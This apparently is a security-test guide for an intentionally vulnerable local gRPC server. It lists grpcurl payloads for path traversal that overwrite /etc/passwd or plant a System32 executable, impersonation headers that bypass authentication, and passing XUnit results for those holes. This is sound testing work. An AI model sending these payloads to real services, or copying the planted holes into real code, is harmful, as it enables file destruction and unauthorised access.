# Security Test Scripts

## Path Traversal Vulnerability Test

The following examples demonstrate the critical path traversal vulnerability identified in the `SetRecord` method:

### Example 1: Writing to arbitrary location
```bash
# This could write a malicious file to the system
grpcurl -plaintext -d '{
  "name": "test",
  "value": "malicious content",
  "path": "../../../tmp/hacked.txt"
}' localhost:5187 insecure.Insecure/SetRecord
```

### Example 2: Attempting to overwrite system files (Linux)
```bash
# DANGEROUS: Could overwrite critical system files if service has permissions
grpcurl -plaintext -d '{
  "name": "evil",
  "value": "hacked",
  "path": "../../../etc/passwd"
}' localhost:5187 insecure.Insecure/SetRecord
```

### Example 3: Windows path traversal
```bash
# DANGEROUS: Could write to Windows system directories
grpcurl -plaintext -d '{
  "name": "windows_attack",
  "value": "malicious executable",
  "path": "..\\..\\..\\Windows\\System32\\malicious.exe"
}' localhost:5187 insecure.Insecure/SetRecord
```

## Authentication Bypass Test

### User Impersonation via Headers
```bash
# Impersonate an administrator
grpcurl -plaintext \
  -H "x-impersonate: admin" \
  -d '{"name": "secret_data"}' \
  localhost:5187 insecure.Insecure/GetRecord

# Impersonate any user
grpcurl -plaintext \
  -H "x-user-id: victim_user" \
  -d '{"name": "sensitive_info"}' \
  localhost:5187 insecure.Insecure/GetRecord
```

## Information Disclosure Test

### Authorization Header Logging
```bash
# This will cause the server to log the authorization header
grpcurl -plaintext \
  -H "authorization: Bearer secret_token_12345" \
  -d '{"name": "test"}' \
  localhost:5187 insecure.Insecure/GetRecord
```

Check the server logs for the leaked authorization token.

**Automated Test Available**: This vulnerability is automatically tested in the XUnit test suite. The `AuthenticationBypass_ShouldAcceptArbitraryUserHeaders` test validates that the server improperly handles client-controlled authentication headers.

## Setup Instructions for Testing

1. Install grpcurl:
   ```bash
   # Linux/macOS
   go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
   
   # Or download binary from: https://github.com/fullstorydev/grpcurl/releases
   ```

2. Start the vulnerable server:
   ```bash
   cd CopilotAgentTests/Grpc.Echo.Server
   dotnet run
   ```

3. Run the test commands above

## Server Testing Results

**✅ SERVER RUNS SUCCESSFULLY**

The gRPC server has been tested and confirmed to run correctly:

- **Build Status**: ✅ Builds successfully with no warnings or errors
- **Runtime Status**: ✅ Starts and runs without issues
- **Listening Address**: `http://localhost:5187`
- **Hosting Environment**: Development
- **Framework**: .NET 8.0

**Server Output:**
```
Building...
info: Microsoft.Hosting.Lifetime[14]
      Now listening on: http://localhost:5187
info: Microsoft.Hosting.Lifetime[0]
      Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
      Hosting environment: Development
info: Microsoft.Hosting.Lifetime[0]
      Content root path: /home/runner/work/mcpCreatioServer/mcpCreatioServer/CopilotAgentTests/Grpc.Echo.Server
```

The server accepts both HTTP and gRPC connections and is ready for security testing.

## Automated Security Tests (XUnit Framework)

**✅ ALL VULNERABILITY TESTS PASS**

A comprehensive XUnit test suite has been created at `CopilotAgentTests/Grpc.Echo.Server.SecurityTests/` that automatically validates all security vulnerabilities:

### Test Results Summary:
```
Test Run Successful.
Total tests: 5
     Passed: 5
 Total time: 1.5075 Seconds
```

### Individual Test Results:

1. **✅ Path Traversal Vulnerability Test**
   - **Status**: VULNERABILITY CONFIRMED
   - **Result**: Path traversal attack successful!
   - **Evidence**: Files can be written to arbitrary locations outside intended directory

2. **✅ Authentication Bypass Test (User Headers)**
   - **Status**: VULNERABILITY CONFIRMED  
   - **Result**: Server accepts client-controlled user identity headers!
   - **Evidence**: Any client can set their own user identity via `x-user-id` header

3. **✅ Authentication Bypass Test (Impersonation)**
   - **Status**: VULNERABILITY CONFIRMED
   - **Result**: Server accepts impersonation headers from clients!
   - **Evidence**: Any client can impersonate any user via `x-impersonate` header

4. **✅ Weak Random Number Generation Test**
   - **Status**: VULNERABILITY CONFIRMED
   - **Result**: Server accepted 3/3 SetRecord requests, indicating weak random number generation is in use
   - **Evidence**: Server uses non-cryptographic `Random()` for ID generation

5. **✅ HTTP Protocol Vulnerability Test**
   - **Status**: VULNERABILITY CONFIRMED
   - **Result**: Server accepts HTTP (unencrypted) connections!
   - **Evidence**: Server allows unencrypted HTTP instead of requiring HTTPS/TLS

### Running the Automated Tests:

```bash
cd CopilotAgentTests/Grpc.Echo.Server.SecurityTests
dotnet test --logger "console;verbosity=detailed"
```

The automated tests provide programmatic validation of all security vulnerabilities and can be integrated into CI/CD pipelines for continuous security testing.

## ⚠️ WARNING ⚠️
These tests are for demonstration purposes only and should NEVER be run against production systems. They demonstrate real security vulnerabilities that could cause system compromise.

## Mitigation Verification

After implementing security fixes, these same tests should fail or be blocked by the security controls.